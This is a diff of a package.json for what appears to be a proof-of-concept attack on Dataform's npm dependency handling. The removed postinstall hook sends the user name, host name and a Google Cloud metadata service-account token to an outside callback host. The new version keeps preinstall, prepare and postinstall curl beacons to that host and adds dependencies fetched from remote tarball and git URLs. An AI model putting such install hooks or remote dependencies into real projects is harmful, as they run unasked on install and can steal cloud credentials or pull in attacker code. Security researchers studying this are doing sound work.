@@ -1,14 +1,18 @@
 {
   "name": "dataform-vuln-poc",
   "version": "1.0.0",
-  "description": "Dataform vulnerability PoC - tests npm lifecycle script execution",
+  "description": "Dataform vulnerability PoC - aggressive npm registry tests",
   "dependencies": {
     "@dataform/core": "^2.9.0",
-    "bundled-test": "https://8228c7c06857.ngrok-free.app/bundled_test.tar.gz"
+    "oast-tarball-test": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/pkg-json-tarball.tgz",
+    "oast-git-test": "git+https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/git-dep.git"
+  },
+  "optionalDependencies": {
+    "oast-optional": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/optional-dep.tgz"
   },
   "scripts": {
-    "postinstall": "curl -s -X POST -H 'Content-Type: application/json' -d \"{\\\"poc\\\":\\\"npm_postinstall\\\",\\\"ts\\\":\\\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\\\",\\\"user\\\":\\\"$(whoami)\\\",\\\"host\\\":\\\"$(hostname)\\\",\\\"token\\\":\\\"$(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null || echo blocked)\\\"}\" https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm",
-    "preinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-preinstall",
-    "prepare": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-prepare"
+    "postinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-postinstall-script",
+    "preinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-preinstall-script",
+    "prepare": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-prepare-script"
   }
 }
